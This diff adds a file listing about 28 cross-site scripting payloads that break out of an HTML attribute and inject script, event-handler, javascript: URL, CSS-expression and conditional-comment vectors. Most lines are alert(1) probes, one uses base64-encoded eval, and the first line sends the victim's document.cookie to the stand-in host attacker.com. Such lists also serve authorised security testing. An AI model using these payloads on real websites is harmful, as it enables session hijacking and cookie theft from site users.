@@ -1,0 +1,28 @@
+"><script>document.location='https://attacker.com/collect.php?cookie='+document.cookie;</script>
+"><svg onload=alert(1)>
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+"><iframe srcdoc="<script>alert(1);</script>">
+"><details open ontoggle=alert(1)>
+"><select autofocus onfocus=alert(1)>
+"><textarea autofocus onfocus=alert(1)>
+"><keygen autofocus onfocus=alert(1)>
+"><audio src onloadstart=alert(1)>
+"><video src onloadstart=alert(1)>
+"><object data=javascript:alert(1)>
+"><embed src=javascript:alert(1)>
+"><applet code=javascript:alert(1)>
+"><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7D>
+"><base href=javascript://example.com/><a href=./>Click me</a>
+"><q cite=javascript:alert(1)>
+"><blockquote cite=javascript:alert(1)>
+"><marquee onstart=alert(1)>
+"><frame src=javascript:alert(1)>
+"><isindex type=image formaction=javascript:alert(1)>
+"><bgsound src=javascript:alert(1)>
+"><style>@import "data:,*%7bx:expression(alert(1))%7D";</style>
+"><!--[if]><script>alert(1);</script -->
+"><!--[if<img src=x onerror=alert(1)//]> -->
+"><!--[if<img src=x onerror=alert(1)//]><!--> -->
+"><!--[if<img src=x onerror=alert(1)//]>--><!--> -->
+"><!--[if<img src=x onerror=alert(1)//]><!-->--><!--> -->
+"><!--[if<img src=x onerror=alert(1)//]><!--><!--> -->
